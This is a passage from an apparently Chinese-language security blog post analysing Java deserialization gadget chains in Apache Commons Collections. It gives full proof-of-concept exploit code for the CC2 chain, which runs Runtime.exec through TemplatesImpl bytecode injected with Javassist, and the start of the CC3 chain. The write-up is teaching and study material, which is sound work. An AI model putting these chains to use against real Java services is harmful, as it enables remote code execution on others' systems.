CtMethod(CtClass.voidType, <span class="string">"printName"</span>, <span class="keyword">new</span> CtClass[]&#123;&#125;, cc);</span><br><span class="line">        ctMethod.setModifiers(Modifier.PUBLIC);</span><br><span class="line">        ctMethod.setBody(<span class="string">"&#123;System.out.println(name);&#125;"</span>);</span><br><span class="line">        cc.addMethod(ctMethod);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//这里会将这个创建的类对象编译为.class文件</span></span><br><span class="line">        cc.writeFile(<span class="string">"./"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            createPseson();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的代码生成的class文件是这样的：</p><p><img src="/2021/04/13/Java_04/20210412145058.png" alt="image-20210412145057711"></p><p>对于命令执行来说有什么用呢，可以在生成的class文件的static语句块中添加想要执行的代码，那么在从class文件创建实例的时候就会自动运行我们想要执行的代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">javassit_test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">createPseson</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        CtClass cc = pool.makeClass(<span class="string">"Cat"</span>);</span><br><span class="line">        String cmd = <span class="string">"System.out.println(\"evil code\");"</span>;</span><br><span class="line">        <span class="comment">// 创建 static 代码块，并插入代码</span></span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        String randomClassName = <span class="string">"EvilCat"</span> + System.nanoTime();</span><br><span class="line">        cc.setName(randomClassName);</span><br><span class="line">        <span class="comment">// 写入.class 文件</span></span><br><span class="line">        cc.writeFile();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            createPseson();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面这段代码中生成的class是这样的：</p><p><img src="/2021/04/13/Java_04/20210412145522.png" alt="image-20210412145521618"></p><p>这里的static语句块会在创建类实例的时候执行</p><h3 id="利用链分析-2"><a href="#利用链分析-2" class="headerlink" title="利用链分析"></a>利用链分析</h3><p>cc2利用的是 java.util 包的 PriorityQueue 类，其readObject函数跟着利用链一路下来之后最后调用了siftDownUsingComparator函数</p><p><img src="/2021/04/13/Java_04/20210409172958.png" alt="image-20210409172948860"></p><p>注意这个compare函数的调用，commons-collection 4.0中TransformingComparator类的compare调用如下</p><p><img src="/2021/04/13/Java_04/20210409173152.png" alt="image-20210409173151407"></p><p>那么设置PriorityQueue类的comparator为TransformingComparator类，再设置TransformingComparator类的transfomer为cc1的ChainedTransformer，即可实现任意代码执行，POC如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">cc2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="comment">//Class runtimeClass=Class.forName("java.lang.Runtime");</span></span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line"><span class="class">                //<span class="title">runtime</span></span>=runtimeClass.getMethod(<span class="string">"getRuntime"</span>).invoke(<span class="keyword">null</span>);</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[]&#123;</span><br><span class="line">                        String.class, Class[].class&#125;, new Object[]&#123;"getRuntime", new Class[0]&#125;),</span><br><span class="line">                new InvokerTransformer("invoke", new Class[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//runtimeClass.getMethod("exec", String.class).invoke(runtime,"calc.exe");</span></span><br><span class="line">                new InvokerTransformer("exec", new Class[]&#123;String.class&#125;, new Object[]&#123;"calc.exe"&#125;)</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="comment">//chain.transform(233);</span></span><br><span class="line">        TransformingComparator comparator = <span class="keyword">new</span> TransformingComparator(chain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//反射修改comparator</span></span><br><span class="line">        PriorityQueue queue = <span class="keyword">new</span> PriorityQueue();</span><br><span class="line"></span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        Class queueclass = Class.forName(<span class="string">"java.util.PriorityQueue"</span>);</span><br><span class="line">        Field field = queueclass.getDeclaredField(<span class="string">"comparator"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(queue, comparator);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        Field field1 = queueclass.getDeclaredField("size");</span></span><br><span class="line"><span class="comment">//        field1.setAccessible(true);</span></span><br><span class="line"><span class="comment">//        field1.set(queue, 3);</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ObjectOutputStream obout = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"out.bin"</span>));</span><br><span class="line">            obout.writeObject(queue);</span><br><span class="line">            ObjectInputStream obin = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"out.bin"</span>));</span><br><span class="line">            obin.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>细节问题：</p><ol><li>为什么要先add两个值？</li></ol><p><img src="/2021/04/13/Java_04/20210409203623.png" alt="image-20210409203622472"></p><p>heapify需要size大于2才能进入siftDown函数，所以需要提前add两个值，使size大于2。其实也可以不用add，直接反射修改size值大于2也是可以的。</p><ol start="2"><li>这里为什么要在add之后才通过反射修改comparator的值?</li></ol><p>add跟进之后会发现调用siftUp函数，这里需要comparator为null，如果提前修改会导致报错，所以add之后才可以修改comparator</p><p><img src="/2021/04/13/Java_04/20210409203849.png" alt="image-20210409203847662"></p><ol start="3"><li>PriorityQueue类的queue参数被transient修饰，为什么也是可控的？</li></ol><p><img src="/2021/04/13/Java_04/20210409204359.png" alt="image-20210409204358167"></p><p>transient真的不能被序列化吗？其实不然，被transient修饰的数据，只是在默认序列化的时候，不会被序列化进去，但是如果自定义序列化，也是可以写入的</p><p><img src="/2021/04/13/Java_04/20210409204840.png" alt="image-20210409204839153"></p><p>比如这里重写的writeObject，defaultReadObject不会序列化queue数据，但是这里手动写入，readObject的时候也可以反序列化出来</p><p>但是这里cc2却没有使用cc1的后半条链，而是利用了一个新的点，<code>com.sun.org.apache.xalan.internal.xsltc.trax</code> 的TemplatesImpl类</p><p>这个类的newTransformer方法会调用getTransletInstance</p><p><img src="/2021/04/13/Java_04/20210412150100.png" alt="image-20210412150058113"> </p><p>defineTransletClasses通过loader.defineClass将bytecode还原成class，然后在getTransletInstance中又通过newInstance创建新实例，如果为恶意的bytecode，那么就会执行static语句块中的代码</p><p><img src="/2021/04/13/Java_04/20210412150359.png" alt="image-20210412150358673"></p><p>Demo：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> Field field = getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> </span>&#123;</span><br><span class="line">        Field field = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="keyword">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        CtClass cc = pool.makeClass(<span class="string">"Str3am"</span>);</span><br><span class="line">        String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\"calc.exe\");"</span>;</span><br><span class="line">        <span class="comment">// 创建 static 代码块，并插入代码</span></span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        String randomClassName = <span class="string">"EvilCat"</span> + System.nanoTime();</span><br><span class="line">        cc.setName(randomClassName);</span><br><span class="line">        <span class="comment">//设置父类为AbstractTranslet</span></span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>()))</span>;</span><br><span class="line">        <span class="comment">// 写入.class 文件</span></span><br><span class="line">        <span class="keyword">byte</span>[] classBytes = cc.toBytecode();</span><br><span class="line">        <span class="keyword">byte</span>[][] targetByteCodes = <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;classBytes&#125;;</span><br><span class="line">        TemplatesImpl templates = TemplatesImpl<span class="class">.<span class="keyword">class</span>.<span class="title">newInstance</span>()</span>;</span><br><span class="line">        setFieldValue(templates, <span class="string">"_bytecodes"</span>, targetByteCodes);</span><br><span class="line">        <span class="comment">// 进入 defineTransletClasses() 方法需要的条件</span></span><br><span class="line">        setFieldValue(templates, <span class="string">"_name"</span>, <span class="string">"name"</span> + System.nanoTime());</span><br><span class="line">        setFieldValue(templates, <span class="string">"_class"</span>, <span class="keyword">null</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">"_tfactory"</span>, <span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line">        templates.newTransformer();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>前面说了，我们已经可以执行到transform方法了，那么我们可以通过InvokerTransformer#transform的反射来调用TemplatesImpl#newtransformer，达到命令执行的目的。</p><p>完整POC：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">cc2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> Field field = getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> </span>&#123;</span><br><span class="line">        Field field = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="keyword">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        CtClass cc = pool.makeClass(<span class="string">"Str3am"</span>);</span><br><span class="line">        String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\"calc.exe\");"</span>;</span><br><span class="line">        <span class="comment">// 创建 static 代码块，并插入代码</span></span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        String randomClassName = <span class="string">"EvilCat"</span> + System.nanoTime();</span><br><span class="line">        cc.setName(randomClassName);</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>()))</span>;</span><br><span class="line">        <span class="comment">// 写入.class 文件</span></span><br><span class="line">        <span class="keyword">byte</span>[] classBytes = cc.toBytecode();</span><br><span class="line">        <span class="keyword">byte</span>[][] targetByteCodes = <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;classBytes&#125;;</span><br><span class="line">        TemplatesImpl templates = TemplatesImpl<span class="class">.<span class="keyword">class</span>.<span class="title">newInstance</span>()</span>;</span><br><span class="line">        setFieldValue(templates, <span class="string">"_bytecodes"</span>, targetByteCodes);</span><br><span class="line">        <span class="comment">// 进入 defineTransletClasses() 方法需要的条件</span></span><br><span class="line">        setFieldValue(templates, <span class="string">"_name"</span>, <span class="string">"name"</span> + System.nanoTime());</span><br><span class="line">        setFieldValue(templates, <span class="string">"_class"</span>, <span class="keyword">null</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">"_tfactory"</span>, <span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line">        Constructor constructor = Class.forName(<span class="string">"org.apache.commons.collections4.functors.InvokerTransformer"</span>).getDeclaredConstructor(String<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvokerTransformer chain = (InvokerTransformer) constructor.newInstance(<span class="string">"newTransformer"</span>);</span><br><span class="line"></span><br><span class="line">        TransformingComparator comparator = <span class="keyword">new</span> TransformingComparator(chain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//反射修改comparator</span></span><br><span class="line">        PriorityQueue queue = <span class="keyword">new</span> PriorityQueue();</span><br><span class="line"></span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        Object[] queue_array = <span class="keyword">new</span> Object[]&#123;templates,<span class="number">1</span>&#125;;</span><br><span class="line">        Field queue_field = Class.forName(<span class="string">"java.util.PriorityQueue"</span>).getDeclaredField(<span class="string">"queue"</span>);</span><br><span class="line">        queue_field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        queue_field.set(queue,queue_array);</span><br><span class="line"></span><br><span class="line">        Class queueclass = Class.forName(<span class="string">"java.util.PriorityQueue"</span>);</span><br><span class="line">        Field field = queueclass.getDeclaredField(<span class="string">"comparator"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(queue, comparator);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        Field field1 = queueclass.getDeclaredField("size");</span></span><br><span class="line"><span class="comment">//        field1.setAccessible(true);</span></span><br><span class="line"><span class="comment">//        field1.set(queue, 3);</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ObjectOutputStream obout = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"out.bin"</span>));</span><br><span class="line">            obout.writeObject(queue);</span><br><span class="line">            ObjectInputStream obin = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"out.bin"</span>));</span><br><span class="line">            obin.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>细节问题：</p><ol><li>为什么要设置恶意类的父类为AbstractTranslet?</li></ol><p>这是因为在defineTransletClasses这个方法中存在一个判断：</p><p><img src="/2021/04/13/Java_04/20210412160742.png" alt="image-20210412160741583"></p><p>我们需要令_transletIndex为i，此时的i为0，默认状态下_transletIndex的值为-1，而如果_transletIndex的值小于0，就会抛出异常：</p><p><img src="/2021/04/13/Java_04/20210412160803.png" alt="image-20210412160801948"></p><p>这里我们也不能通过反射的方式来设置_transletIndex的值，因为还是会进入到_auxClasses方法中，此方法会报出错误，我们依旧无法正常的序列化。</p><h3 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>直接取消了InvokerTransformer 的 Serializable 继承</p><p><img src="/2021/04/13/Java_04/20210412160939.png" alt="image-20210412160938324"></p><h2 id="Commons-Collections-3"><a href="#Commons-Collections-3" class="headerlink" title="Commons Collections 3"></a>Commons Collections 3</h2><p>影响版本：</p><ul><li>Commons Collections 3.1</li></ul><p>测试环境：</p><ul><li>JDK 1.7</li><li>Commons Collections 3.1</li></ul><h3 id="利用链-3"><a href="#利用链-3" class="headerlink" title="利用链"></a>利用链</h3><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="module-access"><span class="module"><span class="identifier">ObjectInputStream</span>.</span></span>read<span class="constructor">Object()</span></span><br><span class="line">            <span class="module-access"><span class="module"><span class="identifier">AnnotationInvocationHandler</span>.</span></span>read<span class="constructor">Object()</span></span><br><span class="line">                <span class="constructor">Map(Proxy)</span>.entry<span class="constructor">Set()</span></span><br><span class="line">                    <span class="module-access"><span class="module"><span class="identifier">AnnotationInvocationHandler</span>.</span></span>invoke<span class="literal">()</span></span><br><span class="line">                        <span class="module-access"><span class="module"><span class="identifier">LazyMap</span>.</span></span>get<span class="literal">()</span></span><br><span class="line">                            <span class="module-access"><span class="module"><span class="identifier">ChainedTransformer</span>.</span></span>transform<span class="literal">()</span></span><br><span class="line">                            <span class="module-access"><span class="module"><span class="identifier">ConstantTransformer</span>.</span></span>transform<span class="literal">()</span></span><br><span class="line">                            <span class="module-access"><span class="module"><span class="identifier">InstantiateTransformer</span>.</span></span>transform<span class="literal">()</span></span><br><span class="line">                            <span class="keyword">new</span><span class="constructor">Instance()</span></span><br><span class="line">                                TrAXFilter#<span class="constructor">TrAXFilter()</span></span><br><span class="line">                                <span class="module-access"><span class="module"><span class="identifier">TemplatesImpl</span>.</span></span><span class="keyword">new</span><span class="constructor">Transformer()</span></span><br><span class="line">                                         <span class="module-access"><span class="module"><span class="identifier">TemplatesImpl</span>.</span></span>get<span class="constructor">TransletInstance()</span></span><br><span class="line">                                         <span class="module-access"><span class="module"><span class="identifier">TemplatesImpl</span>.</span></span>defineTransletClasses</span><br><span class="line">                                         <span class="keyword">new</span><span class="constructor">Instance()</span></span><br><span class="line">                                            <span class="module-access"><span class="module"><span class="identifier">Runtime</span>.</span></span>exec<span class="literal">()</span></span><br></pre></td></tr></table></figure><h3 id="利用链分析-3"><a href="#利用链分析-3" class="headerlink" 